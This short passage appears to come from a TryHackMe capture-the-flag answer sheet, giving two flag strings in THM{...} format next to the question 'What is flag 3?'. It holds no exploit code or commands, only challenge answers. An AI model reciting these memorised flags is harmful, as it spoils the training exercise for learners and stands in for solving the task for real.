`THM{8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}`

3. What is flag 3?

`THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}`
